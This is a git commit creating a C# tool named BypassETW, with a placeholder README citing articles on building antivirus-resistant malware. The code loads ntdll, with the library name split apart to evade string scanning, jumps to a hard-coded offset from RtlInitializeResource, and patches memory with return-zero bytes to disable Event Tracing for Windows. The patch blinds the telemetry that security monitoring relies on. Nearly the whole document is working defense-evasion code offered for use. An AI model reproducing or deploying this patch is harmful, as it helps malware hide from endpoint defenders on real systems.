a4f8aba6aa7218bb9d61cbe9c8c94abf919751a8
Kara-4search <rubyistctrldyt@gmail.com>
2021-07-29 21:04:29 +0800

    first commit

---
+++ BypassETW/Program.cs
@@ -0,0 +1,75 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace BypassETW
+{
+    public class Program
+    {
+        static byte[] patch_code_x64 = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
+        static byte[] patch_code_x86 = new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
+        public static uint etw_offset_x64 = 0x3DEC0;
+        public static uint etw_offset_x86 = 0x590;
+
+        [DllImport("kernel32")]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32")]
+        private static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32")]
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        private static bool is64Bit()
+        {
+            bool is64Bit = true;
+
+            if (IntPtr.Size == 4)
+                is64Bit = false;
+
+            return is64Bit;
+        }
+
+
+        private static void MemoryPatch(byte[] patch, string lib, string funcName, uint offset = 0)
+        {
+
+            uint Oldprotect;
+            uint Newprotect;
+
+            IntPtr libAddr = LoadLibrary(lib);
+            IntPtr funcAddr = GetProcAddress(libAddr, funcName);
+
+            funcAddr = (IntPtr)(funcAddr.ToInt64() + offset);
+            VirtualProtect(funcAddr, (UIntPtr)patch.Length, 0x40, out Oldprotect);
+            Marshal.Copy(patch, 0, funcAddr, patch.Length);
+            VirtualProtect(funcAddr, (UIntPtr)patch.Length, Oldprotect, out Newprotect);
+        }
+
+        private static void CodePatchETW(byte[] patch, uint offset = 0)
+        {
+            MemoryPatch(patch, "ntd" + "ll.d" + "ll", "RtlInitializeResource", offset);
+        }
+
+        public static void StartPatch()
+        {
+            if (is64Bit())
+            {
+                CodePatchETW(patch_code_x64, etw_offset_x64);
+            }
+            else
+            {
+                CodePatchETW(patch_code_x86, etw_offset_x86);
+            }
+        }
+
+
+        static void Main(string[] args)
+        {
+            StartPatch();
+        }
+    }
+}
---
+++ README.md
@@ -0,0 +1,24 @@
+# BypassETW_CSharp
+
+Blog link: working on it 
+
+- A simple Project to Bypass ETW
+
+# README Update later
+
+
+## Usage
+	- Update later
+	
+## TO-DO list
+	- Update later
+	
+## Reference link:
+	1. https://blog.securityevaluators.com/creating-av-resistant-malware-part-1-7604b83ea0c0
+	2. https://blog.securityevaluators.com/creating-av-resistant-malware-part-2-1ba1784064bc
+	3. https://blog.securityevaluators.com/creating-av-resistant-malware-part-3-fdacdf071a5f
+	4. https://blog.securityevaluators.com/creating-av-resistant-malware-part-4-6cb2d215a50f
+	5. https://blog.xpnsec.com/hiding-your-dotnet-etw/
+	6. https://idiotc4t.com/defense-evasion/memory-pacth-bypass-etw
+	7. http://www.hackdig.com/03/hack-73606.htm
+	8. https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
